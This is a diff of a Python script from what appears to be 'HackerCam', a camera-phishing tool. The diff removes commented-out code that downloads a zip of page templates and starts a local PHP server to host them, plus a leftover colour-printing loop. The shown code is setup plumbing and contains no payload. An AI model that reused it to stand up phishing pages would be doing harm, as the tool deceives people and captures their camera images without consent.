@@ -126,37 +126,6 @@ def netcheck():
         print("[!] Internet not available!")
         exit(1)
 
-# def unzip_websites():
-#     if not os.path.exists("websites"):
-#         netcheck()
-#         response = requests.get("https://github.com/k4itrun/HackerCam/releases/latest/download/websites.zip")
-#         with open("websites.zip", "wb") as f:
-#             f.write(response.content)
-#         with zipfile.ZipFile("websites.zip", 'r') as zip_ref:
-#             zip_ref.extractall("websites")
-#         os.remove("websites.zip")
-
-# def start_php_server():
-#     os.makedirs(WEBSITE_PATH, exist_ok=True)
-#     subprocess.run(["rm", "-rf", WEBSITE_PATH + "/*"])
-#     selected_template = os.path.join("websites", DIR)
-#     for file in os.listdir(selected_template):
-#         subprocess.run(["cp", "-r", os.path.join(selected_template, file), WEBSITE_PATH])
-
-#     print(f"[i] Starting PHP2 server at http://{LOCAL_URL}...")
-#     threading.Thread(target=lambda: subprocess.run(["php", "-S", LOCAL_URL, "-t", WEBSITE_PATH])).start()
-#     time.sleep(1)
-#     try:
-#         r = requests.get(f"http://{LOCAL_URL}")
-#         if r.status_code != 200:
-#             raise Exception()
-#         print("[+] PHP server started successfully!")
-#     except:
-#         print("[!] PHP server failed to start!")
-#         exit(1)
-
-# safe stub for url_manager if not provided elsewhere
-# ...existing code...
 def url_manager(link, disp_index=1, mask_index=2):
     """
     Print URLs similarly to the original shell function:
@@ -550,12 +519,3 @@ if __name__ == "__main__":
         print(f"\n[!] Fatal error: {e}")
         exit(1)
 
-# # Print header
-# print("256-color foreground examples (0-255):\n")
-
-# for n in range(0, 256):
-#     # 38;5;N -> set foreground to color N
-#     print(f"{esc(f'38;5;{n1}')} {n:3d} \u2588\u2588\u2588 {RESET}", end='')
-#     # Print 16 colors per line
-#     if (n + 1) % 16 == 0:
-#         print()
